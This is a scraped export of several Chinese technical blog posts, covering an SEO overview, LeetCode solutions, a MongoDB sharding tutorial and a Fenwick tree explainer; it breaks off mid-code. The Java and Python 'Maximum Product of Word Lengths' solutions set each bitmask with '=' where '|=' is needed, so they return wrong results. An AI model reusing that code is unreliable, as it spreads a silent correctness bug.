黑帽(Blackhat)：作弊方式的SEO方法，不符合搜索引擎质量规范 白帽(Whitehat)：符合搜索引擎网站质量规范的SEO 灰帽SEO(Greyhat)：介于白帽和黑帽之间的优化方法 黑帽的手法 黑帽SEO迟早被搜索引擎惩罚，不要使用这种方法。 黑帽包括如下： 隐藏文字： 如和背景颜色相近或相同的文字，来堆积关键词 隐藏页面：用户和搜索引擎看到的不是一个页面，搜索引擎看到的是一个高度优化、常常优化到没有可读性的页面。 隐藏链接：如黑入其他网站，加入自己网站的链接 垃圾链接：如博客评论里锚链接使用商品名称作为关键词。 =&gt;Akismet插件 买卖链接：搜索引擎明确十分痛恨这种行为，一旦被查到。。。 链接农场/大规模站群：一个站长有一群网站，这些网站互相交叉链接。或者用这些网站共同推一个主网站 链接到坏邻居：自己的网站链接到被判断出作弊并被惩罚的网站，可能被牵连。 搜索引擎的惩罚方式 惩罚主要的关键词 所有的关键词排名全面下降 PR值下降 负6惩罚，负30，负950（排名下降的固定名次） 如果一个IP地址上的大部分网站都被惩罚，那么这个IP地址或整个服务器可能被牵连（虽然比较少见），所以独立IP比共享IP好。 Google和百度的区别 Google很容易收录新网站和新页面，不过Google有沙盒效应，收录门槛很低，获得好的排名比较难。百度对于新网站考核期长，不容易被收录。而一旦被收录，比较容易获得排名和流量。网站刚开始时的原创性对百度来说比较重要。 百度有比较大的首页优势，而Google对所有页面一视同仁，不管是首页还是内页。 Google对外部链接比较重视。对关键词反而没有那么敏感。百度相反。 百度排名经常有大起大落。而Google对网站的排名处理总是渐进式的。 百度对网站更新比较看重。google除非是有时效性的网站外，没有多大要求。 Google现在会读取、解析js和css文件，渲染出和用户看到的一样的页面内容和布局。 移动适配 可以简历专用的和PC版不一样的URL，但还是推荐响应式设计（也叫自适应设计 responsive design）。 wordpress_如果主题没有响应式，可以安装 wptouch 移动自适应站百度建议加上以下标志，帮助百度理解页面适用于PC和手机 1&lt;meta name&#x3D;&quot;applicable-device&quot;content&#x3D;&quot;pc,mobile&quot;&gt; 参考资料 Google Search Engine Optimization Starter Guide 汉化版 ：http://pan.baidu.com/s/1c0NvJuo 密码：miix 百度搜索引擎优化指南 《SEO 实战密码 第3版》 Zac 很详细，虽然有些现在过时的内容。 可以看 本博客的SEO实战记录","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"others","slug":"others","permalink":"https://www.hrwhisper.me/categories/others/"},{"name":"建站经验","slug":"others/建站经验","permalink":"https://www.hrwhisper.me/categories/others/%E5%BB%BA%E7%AB%99%E7%BB%8F%E9%AA%8C/"},{"name":"计算机基础","slug":"study/计算机基础","permalink":"https://www.hrwhisper.me/categories/study/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"SEO","slug":"SEO","permalink":"https://www.hrwhisper.me/tags/SEO/"}]},{"title":"leetcode Maximum Product of Word Lengths","slug":"leetcode-maximum-product-of-word-lengths","date":"2015-12-16T00:51:33.000Z","updated":"2021-01-08T13:32:16.844Z","comments":true,"path":"leetcode-maximum-product-of-word-lengths/","link":"","permalink":"https://www.hrwhisper.me/leetcode-maximum-product-of-word-lengths/","excerpt":"leetcode Maximum Product of Word Lengths Given a string array words, find the maximum value of length(word[i]) * length(word[j]) where the two words do not share common letters. You may assume that each word will contain only lower case letters. If no such two words exist, return 0. Example 1: Given [\"abcw\", \"baz\", \"foo\", \"bar\", \"xtfn\", \"abcdef\"] Return 16 The two words can be \"abcw\", \"xtfn\". Example 2: Given [\"a\", \"ab\", \"abc\", \"d\", \"cd\", \"bcd\", \"abcd\"] Return 4 The two words can be \"ab\", \"cd\". Example 3: Given [\"a\", \"aa\", \"aaa\", \"aaaa\"] Return 0 No such pair of words. Follow up: Could you do better than O(_n_2), where n is the number of words?","text":"leetcode Maximum Product of Word Lengths Given a string array words, find the maximum value of length(word[i]) * length(word[j]) where the two words do not share common letters. You may assume that each word will contain only lower case letters. If no such two words exist, return 0. Example 1: Given [\"abcw\", \"baz\", \"foo\", \"bar\", \"xtfn\", \"abcdef\"] Return 16 The two words can be \"abcw\", \"xtfn\". Example 2: Given [\"a\", \"ab\", \"abc\", \"d\", \"cd\", \"bcd\", \"abcd\"] Return 4 The two words can be \"ab\", \"cd\". Example 3: Given [\"a\", \"aa\", \"aaa\", \"aaaa\"] Return 0 No such pair of words. Follow up: Could you do better than O(_n_2), where n is the number of words? 题目地址: leetcode Maximum Product of Word Lengths 题意：给定一个字符串数组，求它们中，元素各不相同的字符串长度乘积最大值。 如样例1中，abcw 和 xtfn 成绩为4*4 =16 （元素互不相同） 而abcw 和 abcdef为0，因为有相同的元素 思路： 方法一 直接看看每个字符串都包括了哪个字符，然后一一枚举是否有交集： 有交集，则乘积为0 无交集，乘积为 words[i].length() * words[j].length() 于是写出如下代码 C++ 1234567891011121314151617181920212223242526class Solution &#123;public: int maxProduct(vector&lt;string&gt;&amp; words) &#123; int n = words.size(); vector&lt;vector&lt;int&gt; &gt; elements(n, vector&lt;int&gt;(26, 0)); for (int i = 0; i &lt; n; i++) &#123; for (int j = 0; j &lt; words[i].length(); j++) elements[i][words[i][j] - &#x27;a&#x27;] ++; &#125; int ans = 0; for (int i = 0; i &lt; n; i++) &#123; for (int j = i + 1; j &lt; n; j++) &#123; bool flag = true; for (int k = 0; k &lt; 26; k++) &#123; if (elements[i][k] != 0 &amp;&amp; elements[j][k] != 0) &#123; flag = false; break; &#125; &#125; if (flag &amp;&amp; words[i].length() * words[j].length() &gt; ans) ans = words[i].length() * words[j].length(); &#125; &#125; return ans; &#125;&#125;; 方法二 其实因为全部都是小写的字母，用int 就可以存储每一位的信息。这就是位运算 elements[i] = 1 &lt;&lt; (words[i][j] - 'a'); //把words[i][j] 在26字母中的出现的次序变为1 elements[i] &amp; elements[j] // 判断是否有交集只需要两个数 按位 与 （AND）运算即可 C++ 12345678910111213141516171819class Solution &#123;public: int maxProduct(vector&lt;string&gt;&amp; words) &#123; int n = words.size(); vector&lt;int&gt; elements(n, 0); for (int i = 0; i &lt; n; i++) &#123; for (int j = 0; j &lt; words[i].length(); j++) elements[i] |= 1 &lt;&lt; (words[i][j] - &#x27;a&#x27;); &#125; int ans = 0; for (int i = 0; i &lt; n; i++) &#123; for (int j = i + 1; j &lt; n; j++) &#123; if (!(elements[i] &amp; elements[j]) &amp;&amp; words[i].length() * words[j].length() &gt; ans) ans = words[i].length() * words[j].length(); &#125; &#125; return ans; &#125;&#125;; Java 1234567891011121314151617181920public class Solution &#123; public int maxProduct(String[] words) &#123; int n = words.length; int[] elements = new int[n]; for (int i=0;i&lt;n;i++)&#123; for(int j=0;j&lt;words[i].length();j++)&#123; elements[i] = 1 &lt;&lt; (words[i].charAt(j) - &#x27;a&#x27;); &#125; &#125; int ans = 0; for (int i = 0; i &lt; n; i++) &#123; for (int j = i + 1; j &lt; n; j++) &#123; if ((elements[i] &amp; elements[j]) == 0) ans = Math.max(ans,words[i].length() * words[j].length()); &#125; &#125; return ans; &#125;&#125; Python 123456789101112131415161718class Solution(object): def maxProduct(self, words): &quot;&quot;&quot; :type words: List[str] :rtype: int &quot;&quot;&quot; n = len(words) elements = [0] * n for i, s in enumerate(words): for c in s: elements[i] = 1 &lt;&lt; (ord(c) - 97) ans = 0 for i in xrange(n): for j in xrange(i + 1, n): if not (elements[i] &amp; elements[j]): ans = max(ans, len(words[i]) * len(words[j])) return ans","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"},{"name":"Java","slug":"Java","permalink":"https://www.hrwhisper.me/tags/Java/"}]},{"title":"windows 下 MongoDB 数据分片(sharding) 实战","slug":"mongodb-sharding-tutorials-on-windows","date":"2015-12-14T01:45:39.000Z","updated":"2021-01-08T13:42:14.070Z","comments":true,"path":"mongodb-sharding-tutorials-on-windows/","link":"","permalink":"https://www.hrwhisper.me/mongodb-sharding-tutorials-on-windows/","excerpt":"前言： 当数据量大的时候，一台机器可能不足以满足性能的需求，如存储空间、内存不足，而垂直扩展十分昂贵，故用分片进行水平扩展是一个很好的解决方法。 本文介绍了mongodb 进行分片的方法和步骤","text":"前言： 当数据量大的时候，一台机器可能不足以满足性能的需求，如存储空间、内存不足，而垂直扩展十分昂贵，故用分片进行水平扩展是一个很好的解决方法。 本文介绍了mongodb 进行分片的方法和步骤 mongodb分片 结构 mongodb-sharded-cluster-production-architecture 主要由下面的三部分组成 Shard: 可以使mongod也可以是几台机器组个一个replica set，防止主机单点故障 Config Server: 存储整个集群的配置信息，如 chunk 大小。 Query Routers: mongos实例，是客户端的入口。让整个集群看上去像单一数据库，前端应用可以透明使用。 配置步骤 1.启动所有的配置服务器config server 语法： 1mongod --configsvr --replSet configReplSet --port &lt;port&gt; --dbpath &lt;path&gt; 例如: 123mongod --configsvr --dbpath e:\\mongodb\\config\\ --port 27019mongod --configsvr --dbpath e:\\mongodb\\config2\\ --port 27020mongod --configsvr --dbpath e:\\mongodb\\config3\\ --port 27021 或者用配置文件 https://docs.mongodb.org/manual/reference/configuration-options/ 2.启动Mongos实例 语法(下面两种均可) 12mongos --configdb configReplSet&#x2F;&lt;cfgsvr1:port1&gt;,&lt;cfgsvr2:port2&gt;,&lt;cfgsvr3:port3&gt;mongos --configdb cfg0.example.net:27019,cfg1.example.net:27019,cfg2.example.net:27019 例如: 1mongos --configdb hrwhisper.mongo.shards1:27019,hrwhisper.mongo.shards2:27020,hrwhisper.mongo.shards3:27021 注意： 使用localhost和远程地址混用会报错，我是修改host文件: 127.0.0.1 hrwhisper.mongo.shards1 127.0.0.1 hrwhisper.mongo.shards2 127.0.0.1 hrwhisper.mongo.shards3 mongos实例默认运行在27017端口 貌似3.2需要3个config server 3.启动shard 可以用普通的mongod 12mongod --dbpath e:\\mongodb\\twitter\\ --port 27030mongod --dbpath e:\\mongodb\\twitter2\\ --port 27031 4.添加分片进mongos 1.用mongo 连接上mongos（直接输入mongo既可以连上，如果你修改了mongos端口，则mongo --port ） 1mongo --host &lt;hostname of machine running mongos&gt; --port &lt;port mongos listens on&gt; 使用sh.addShard() 添加shard to cluster （每个shard都要进行一次） 添加 复制集名为rs1运行在mongodb0.example.net ：27017 sh.addShard( \"rs1/mongodb0.example.net:27017\" ) 添加单一的 mongod sh.addShard( \"mongodb0.example.net:27017\" ) 例如: 12sh.addShard(&quot;hrwhisper.mongo.201.1:27030&quot; )sh.addShard(&quot;hrwhisper.mongo.asus:27030&quot; ) 注： 需要一些时间将块迁移到新的shard 可以使用 database command 来设置名称和shards最大的大小 5.对database启用分片 先用mongo shell 连接到mongos 实例， 使用sh.enableSharding() 指定要开启分片的数据库或者db.runCommand() 12sh.enableSharding(&quot;&lt;database&gt;&quot;)db.runCommand( &#123; enableSharding: &lt;database&gt; &#125; ) 例如: 1sh.enableSharding(&quot;twitter&quot;) 一旦enable了个数据库，mongos将会把数据库里的不同数据集放在不同的分片上。只有数据集也被分片，否则一个数据集的所有数据将放在一个分片上。 6.对collection启用分片 使用 sh.shardCollection() 对集合进行分片 sh.shardCollection(\".\", shard-key-pattern) 例如: 1234通过zipcode分片，如果zipcode值一样，则用namesh.shardCollection(&quot;records.people&quot;, &#123; &quot;zipcode&quot;: 1, &quot;name&quot;: 1 &#125; )通过对_id进行哈希分片sh.shardCollection(&quot;events.alerts&quot;, &#123; &quot;_id&quot;: &quot;hashed&quot; &#125; ) 注：需要先建立对应的索引 1db.stream.createIndex( &#123; _id: &quot;hashed&quot; &#125; ) 其他 查看分片状态 用mongo 连接上mongos， 然后通过Mongo命令行输入：sh.status() mongodb-sharding-status 移除分片 需要切换到admin collection，然后再执行移除分片的代码： 1db.runCommand( &#123; removeShard: &quot;&lt;shardname&gt;&quot; &#125; ) 再次查看状态： mongodb-shard-remove 分片实战 修改hosts文件： 127.0.0.1 hrwhisper.mongo.shards1 127.0.0.1 hrwhisper.mongo.shards2 127.0.0.1 hrwhisper.mongo.shards3 12345678910111213141516mongod --configsvr --dbpath e:\\mongodb\\config\\ --port 27019mongod --configsvr --dbpath e:\\mongodb\\config2\\ --port 27020mongod --configsvr --dbpath e:\\mongodb\\config3\\ --port 27021mongos --configdb hrwhisper.mongo.shards1:27019,hrwhisper.mongo.shards2:27020,hrwhisper.mongo.shards3:27021mongod --dbpath e:\\mongodb\\twitter\\ --port 27030mongod --dbpath e:\\mongodb\\twitter2\\ --port 27031sh.addShard(&quot;hrwhisper.mongo.shards1:27030&quot; )sh.addShard(&quot;hrwhisper.mongo.shards2:27031&quot; )sh.enableSharding(&quot;twitter&quot;)sh.shardCollection(&quot;twitter.stream&quot;, &#123;&#39;_id&#39;:&#39;hashed&#39;&#125;) 参考资料 MongoDB 官方文档 MongoDB分片实战(二)：Sharding MongoDB集群的Sharding详解 MongoDB 自动分片 auto sharding","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"数据库","slug":"study/数据库","permalink":"https://www.hrwhisper.me/categories/study/%E6%95%B0%E6%8D%AE%E5%BA%93/"}],"tags":[{"name":"mongodb","slug":"mongodb","permalink":"https://www.hrwhisper.me/tags/mongodb/"},{"name":"nosql","slug":"nosql","permalink":"https://www.hrwhisper.me/tags/nosql/"}]},{"title":"leetcode Peeking Iterator","slug":"leetcode-peeking-iterator","date":"2015-12-12T09:44:50.000Z","updated":"2021-01-08T13:32:16.857Z","comments":true,"path":"leetcode-peeking-iterator/","link":"","permalink":"https://www.hrwhisper.me/leetcode-peeking-iterator/","excerpt":"Given an Iterator class interface with methods: next() and hasNext(), design and implement a PeekingIterator that support the peek() operation -- it essentially peek() at the element that will be returned by the next call to next() Here is an example. Assume that the iterator is initialized to the beginning of the list: [1, 2, 3]. Call next() gets you 1, the first element in the list. Now you call peek() and it returns 2, the next element. Calling next() after that still return 2. You call next() the final time and it returns 3, the last element. Calling hasNext() after that should return false. Hint: Think of \"looking ahead\". You want to cache the next element. Is one variable sufficient? Why or why not? Test your design with call order of peek() before next() vs next() before peek(). For a clean implementation, check out Google's guava library source code. Follow up: How would you extend your design to be generic and work with all types, not just integer?","text":"Given an Iterator class interface with methods: next() and hasNext(), design and implement a PeekingIterator that support the peek() operation -- it essentially peek() at the element that will be returned by the next call to next() Here is an example. Assume that the iterator is initialized to the beginning of the list: [1, 2, 3]. Call next() gets you 1, the first element in the list. Now you call peek() and it returns 2, the next element. Calling next() after that still return 2. You call next() the final time and it returns 3, the last element. Calling hasNext() after that should return false. Hint: Think of \"looking ahead\". You want to cache the next element. Is one variable sufficient? Why or why not? Test your design with call order of peek() before next() vs next() before peek(). For a clean implementation, check out Google's guava library source code. Follow up: How would you extend your design to be generic and work with all types, not just integer? 传送门： leetcode Peeking Iterator 题意： 已经给定了Iterator接口 next() hasNext() 让你在此基础上实现PeekingIterator peek()：返回下一个元素，但指针不移动到下一个 next()： 移动到下一个元素x并返回x hasNext() ：返回有下一个元素 思路： 分语言而定，详见代码。 C++ 定义peek()方法，而peek可以新建一个临时对象，返回其下一个即可。 至于next 和 hasNext直接用父类的方法即可。 123456789101112131415161718192021222324252627282930// Below is the interface for Iterator, which is already defined for you.// **DO NOT** modify the interface for Iterator.class Iterator &#123; struct Data; Data* data;public: Iterator(const vector&lt;int&gt;&amp; nums); Iterator(const Iterator&amp; iter); virtual ~Iterator(); // Returns the next element in the iteration. int next(); // Returns true if the iteration has more elements. bool hasNext() const;&#125;;class PeekingIterator : public Iterator &#123;public: PeekingIterator(const vector&lt;int&gt;&amp; nums) : Iterator(nums) &#123; // Initialize any member here. // **DO NOT** save a copy of nums and manipulate it directly. // You should only use the Iterator interface methods. &#125; // Returns the next element in the iteration without advancing the iterator. int peek() &#123; return Iterator(*this).next(); &#125;&#125;; Java 建一个成员变量cur，记录下一个指针指向的值。 peek： 直接返回cur next: res = cur , 并 判断是否有下一个，若有则赋值为iterator.next，否则null hasNext: 判断cur是否为null 12345678910111213141516171819202122232425262728293031323334// Java Iterator interface reference:// https://docs.oracle.com/javase/8/docs/api/java/util/Iterator.htmlclass PeekingIterator implements Iterator&lt;Integer&gt; &#123; Iterator&lt;Integer&gt; iterator; Integer cur ; public PeekingIterator(Iterator&lt;Integer&gt; iterator) &#123; // initialize any member here. this.iterator = iterator; this.cur = iterator.hasNext()? iterator.next() :null; &#125; // Returns the next element in the iteration without advancing the iterator. public Integer peek() &#123; return cur; &#125; // hasNext() and next() should behave the same as in the Iterator interface. // Override them if needed. @Override public Integer next() &#123; Integer res = cur; this.cur = iterator.hasNext()? iterator.next() :null; return res; &#125; @Override public boolean hasNext() &#123; return cur != null; &#125;&#125; Python 同Java 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859# Below is the interface for Iterator, which is already defined for you.## class Iterator(object):# def __init__(self, nums):# &quot;&quot;&quot;# Initializes an iterator object to the beginning of a list.# :type nums: List[int]# &quot;&quot;&quot;## def hasNext(self):# &quot;&quot;&quot;# Returns true if the iteration has more elements.# :rtype: bool# &quot;&quot;&quot;## def next(self):# &quot;&quot;&quot;# Returns the next element in the iteration.# :rtype: int# &quot;&quot;&quot;class PeekingIterator(object): def __init__(self, iterator): &quot;&quot;&quot; Initialize your data structure here. :type iterator: Iterator &quot;&quot;&quot; self.iterator = iterator self.cur = self.iterator.next() if self.iterator.hasNext() else None def peek(self): &quot;&quot;&quot; Returns the next element in the iteration without advancing the iterator. :rtype: int &quot;&quot;&quot; return self.cur def next(self): &quot;&quot;&quot; :rtype: int &quot;&quot;&quot; val = self.cur self.cur = self.iterator.next() if self.iterator.hasNext() else None return val def hasNext(self): &quot;&quot;&quot; :rtype: bool &quot;&quot;&quot; return self.cur is not None # Your PeekingIterator object will be instantiated and called as such:# iter = PeekingIterator(Iterator(nums))# while iter.hasNext():# val = iter.peek() # Get the next element but not advance the iterator.# iter.next() # Should return the same value as [val].","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"Data Structure","slug":"Data-Structure","permalink":"https://www.hrwhisper.me/tags/Data-Structure/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"},{"name":"Java","slug":"Java","permalink":"https://www.hrwhisper.me/tags/Java/"}]},{"title":"leetcode Remove Duplicate Letters","slug":"leetcode-remove-duplicate-letters","date":"2015-12-09T07:33:45.000Z","updated":"2021-01-08T13:32:16.864Z","comments":true,"path":"leetcode-remove-duplicate-letters/","link":"","permalink":"https://www.hrwhisper.me/leetcode-remove-duplicate-letters/","excerpt":"leetcode Remove Duplicate Letters Given a string which contains only lowercase letters, remove duplicate letters so that every letter appear once and only once. You must make sure your result is the smallest in lexicographical order among all possible results. Example: Given \"bcabc\" Return \"abc\" Given \"cbacdcbc\" Return \"acdb\"","text":"leetcode Remove Duplicate Letters Given a string which contains only lowercase letters, remove duplicate letters so that every letter appear once and only once. You must make sure your result is the smallest in lexicographical order among all possible results. Example: Given \"bcabc\" Return \"abc\" Given \"cbacdcbc\" Return \"acdb\" 传送门：leetcode Remove Duplicate Letters 题意： 给定一个全部由小写组成的字符串，要求删除它重复的元素，使得字典序最小 思路： 方法一 用栈。 首先对字符串出现的个数进行统计。 然后对字符串扫描，每遇到一个字符串，判断其是否在栈中，如果在则跳过。（计数 - 1） 如果不在栈中，和栈顶的元素判断，要是当前栈顶的元素比较大而且cnt不为0（也就是说之后还有这个元素），就把栈顶弹出。然后把当前的元素入栈。 Python 52ms 1234567891011121314151617181920class Solution(object): def removeDuplicateLetters(self, s): &quot;&quot;&quot; :type s: str :rtype: str &quot;&quot;&quot; vis, cnt = [False] * 26, [0] * 26 ans = [] for c in s: cnt[ord(c) - 97] += 1 # ord(a) =97 for c in s: index = ord(c) - 97 cnt[index] -= 1 if vis[index]: continue while ans and ans[-1] &gt; c and cnt[ord(ans[-1]) - 97]: vis[ord(ans.pop()) - 97] = False ans.append(c) vis[index] = True return &#x27;&#x27;.join(ans) 方法二 和这个差不多https://leetcode.com/discuss/73777/easy-to-understand-iterative-java-solution 找每个字符出现的最后的位置， 取其中最小的作为end。（这个元素必须在end或者end以前出现，否则就没了= =） 从start（一开始设为0）枚举到end，最小的那个作为当前的字符。如此循环。 如：dcbacdcd 最后出现的位置：a:3 , b: 2, c : 6, d: 7 于是0~2中最小的元素为b 接着3~3 为a 接着 4~6 为c 接着 7~7 为d 所以为bacd Python 108ms 1234567891011121314151617181920212223class Solution(object): def removeDuplicateLetters(self, s): if not s: return &#x27;&#x27; last_pos = &#123;&#125; for i, c in enumerate(s): last_pos[c] = i last_pos = collections.OrderedDict(sorted(last_pos.items(), key=lambda x: x[1])) start, end = 0, last_pos.items()[0][1] ans = [] for i in xrange(len(last_pos)): min_c = &#x27;z&#x27; for k in xrange(start, end + 1): if min_c &gt; s[k] and s[k] in last_pos: min_c = s[k] start = k + 1 ans += [min_c] del last_pos[min_c] if not last_pos: break end = last_pos.items()[0][1] return &#x27;&#x27;.join(ans) 方法三 每次对每个字母出现的次数进行统计 cnt 然后扫描数组，找最小的字符min_c，并对于经过的每一个元素 cnt - 1 ，直到数组扫描完毕或者遇到cnt = 0的（cnt = 0说明后面没有这个元素了，不能继续，否则就丢掉了这个元素） 然后把字符串s中 min_c 替换成空 如此循环。 Python 260ms 123456789101112131415161718class Solution(object): def removeDuplicateLetters(self, s): &quot;&quot;&quot; :type s: str :rtype: str &quot;&quot;&quot; ans = &#x27;&#x27; while s: cnt = collections.Counter(s) min_c, index = s[0], 0 for i, c in enumerate(s): if min_c &gt; c: min_c, index = c, i cnt[c] -= 1 if not cnt[c]: break ans += min_c s = s[index + 1:].replace(min_c,&#x27;&#x27;) return ans","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"Binary indexed tree (Fenwick tree)","slug":"binary-indexed-tree-fenwick-tree","date":"2015-12-06T15:26:48.000Z","updated":"2021-01-08T13:42:14.028Z","comments":true,"path":"binary-indexed-tree-fenwick-tree/","link":"","permalink":"https://www.hrwhisper.me/binary-indexed-tree-fenwick-tree/","excerpt":"本文简单介绍Binary indexed tree (Fenwick tree)","text":"本文简单介绍Binary indexed tree (Fenwick tree) Fenwick tree 它又叫 Binary indexed tree ，也叫树状数组。 能在log(n)查询区间和，并且在log(n)时间内进行结点更新操作。 lowbit(x)函数 定义lowbit(x)为x的二进制表达式中最右边的1所对应的值。 比如，1234的二进制是0100 1101 0010 则 lowbit(1234)=2 在程序的实现中，Lowbit(x) = x &amp; -x;（为什么这样写呢？因为计算机内部采用补码表示，-x是x按位取反，尾数+1的结果） 树的结构图 让我们来看看图：横坐标是x, 纵坐标是lowbit(x) fenwick_tree_binary_index_tree 对于节点x： 为左子结点，则父结点的编号是x + lowbit(x) 为右子结点，则父结点的编号是x - lowbit(x) 设C[i] 为以i结尾的水平长条内的元素之和，如c[6]=a5+a6。 顺着结点i往左走，边走边往上爬，沿途经过的c[i]所对应的长条不重复不遗漏的包含了所有需要累加的元素。 如sum(6) = c[6] + c[4] 如果修改了一个a[i] ,那么从c[i]往右走，边走边网上爬，沿途修改所有结点对应的c[i]即可。 如a[1] + 1 那么c[1] + 1, c[2]+1,c[4]+1.........一直到最大值。 用C++ 的代码如下： 123456789101112131415161718192021inline int lowbit(int x) &#123; return x &amp; (-x); &#125; int sum(int x) &#123; int ans = 0; while(x &gt; 0) &#123; ans += C[x]; x -= lowbit(x); &#125; return ans; &#125; void add(int x,int d) &#123; while(x &lt;= N) &#123; C[x] += d; x += lowbit(x); &#125;&#125; 实现代码 写成类的话： C++ 1234567891011121314151617181920212223242526class FenwickTree &#123; vector&lt;int&gt; sum_array; int n; inline int lowbit(int x) &#123; return x &amp; -x; &#125;public: FenwickTree(int n) :n(n), sum_array(n + 1, 0) &#123;&#125; void add(int x, int val) &#123; while (x &lt;= n) &#123; sum_array[x] += val; x += lowbit(x); &#125; &#125; int sum(int x) &#123; int res = 0; while (x &gt; 0) &#123; res += sum_array[x]; x -= lowbit(x); &#125; return res; &#125;&#125;; Python 12345678910111213141516171819class FenwickTree(object): def __init__(self, n): self.sum_array = [0] * (n + 1) self.n = n def lowbit(self, x): return x &amp; -x def add(self, x, val): while x &lt;= self.n: self.sum_array[x] += val x += self.lowbit(x) def sum(self, x): res = 0 while x &gt; 0: res += self.sum_array[x] x -= self.lowbit(x) return res","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"算法笔记","slug":"study/算法笔记","permalink":"https://www.hrwhisper.me/categories/study/%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"Data Structure","slug":"Data-Structure","permalink":"https://www.hrwhisper.me/tags/Data-Structure/"}]},{"title":"leetcode Count of Smaller Numbers After Self","slug":"leetcode-count-of-smaller-numbers-after-self","date":"2015-12-06T14:44:27.000Z","updated":"2021-01-08T13:32:16.834Z","comments":true,"path":"leetcode-count-of-smaller-numbers-after-self/","link":"","permalink":"https://www.hrwhisper.me/leetcode-count-of-smaller-numbers-after-self/","excerpt":"leetcode Count of Smaller Numbers After Self You are given an integer array nums and you have to return a new counts array. The counts array has the property where counts[i] is the number of smaller elements to the right of nums[i]. Example: Given nums = [5, 2, 6, 1] To the right of 5 there are 2 smaller elements (2 and 1). To the right of 2 there is only 1 smaller element (1). To the right of 6 there is 1 smaller element (1). To the right of 1 there is 0 smaller element. Return the array [2, 1, 1, 0].","text":"leetcode Count of Smaller Numbers After Self You are given an integer array nums and you have to return a new counts array. The counts array has the property where counts[i] is the number of smaller elements to the right of nums[i]. Example: Given nums = [5, 2, 6, 1] To the right of 5 there are 2 smaller elements (2 and 1). To the right of 2 there is only 1 smaller element (1). To the right of 6 there is 1 smaller element (1). To the right of 1 there is 0 smaller element. Return the array [2, 1, 1, 0]. 题目地址 leetcode Count of Smaller Numbers After Self 题意： 给定nums数组，求数组中每个元素i的右边比其小的数 思路： 简单的说就是求逆序数。 使用逆序数有经典的解法为合并排序。 用Fenwick树 关于Fenwick 树介绍 Binary indexed tree (Fenwick tree) 简单说就是看当前数在nums中排第几，然后对小于它的数求个数和 具体的做法是先离散化，确定每个数载nums中排到第几 （去重和排序） 然后从右向左扫描，每次统计比其小于1的个数（就是求和），然后把当前的数加入Fenwick中。 merge_sort C++ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465struct Node &#123; int val; int index; int cnt; Node(int val, int index) : val(val), index(index), cnt(0) &#123;&#125; bool operator &lt;= (const Node &amp;node2)const &#123; return val &lt;= node2.val; &#125;&#125;;class Solution &#123;public: void combine(vector&lt;Node&gt; &amp;nums, int Lpos, int Lend, int Rend, vector&lt;Node&gt; &amp;temp) &#123; int Rpos = Lend + 1; int Tpos = Lpos; int n = Rend - Lpos + 1; int t = Rpos; while (Lpos &lt;= Lend &amp;&amp; Rpos &lt;= Rend) &#123; if (nums[Lpos] &lt;= nums[Rpos]) &#123; temp[Tpos] = nums[Lpos]; temp[Tpos].cnt += Rpos - t ; Tpos++; Lpos++; &#125; else &#123; temp[Tpos++] = nums[Rpos++]; &#125; &#125; while (Lpos &lt;= Lend) &#123; temp[Tpos] = nums[Lpos]; temp[Tpos].cnt += Rpos - t; Tpos++; Lpos++; &#125; while (Rpos &lt;= Rend) temp[Tpos++] = nums[Rpos++]; for (int i = 0; i&lt; n; i++, Rend--) nums[Rend] = temp[Rend]; &#125; void merge_sort(vector&lt;Node&gt; &amp; nums, int L, int R, vector&lt;Node&gt; &amp;temp) &#123; if (L &lt; R) &#123; int m = (L + R) &gt;&gt; 1; merge_sort(nums, L, m, temp); merge_sort(nums, m + 1, R, temp); combine(nums, L, m, R, temp); &#125; &#125; vector&lt;int&gt; countSmaller(vector&lt;int&gt;&amp; nums) &#123; vector&lt;Node&gt; mynums; vector&lt;Node&gt; temp(nums.size(), Node(0, 0)); for (int i = 0; i &lt; nums.size(); i++) mynums.push_back(Node(nums[i], i)); vector&lt;int&gt; ans(nums.size(), 0); merge_sort(mynums, 0, nums.size() - 1, temp); for (int i = 0; i &lt; nums.size(); i++) ans[mynums[i].index] = mynums[i].cnt; return ans; &#125;&#125;; Binary indexed tree (Fenwick tree) C++ 123456789101112131415161718192021222324252627282930313233343536373839404142434445class FenwickTree &#123; vector&lt;int&gt; sum_array; int n; inline int lowbit(int x) &#123; return x &amp; -x; &#125;public: FenwickTree(int n) :n(n), sum_array(n + 1, 0) &#123;&#125; void add(int x, int val) &#123; while (x 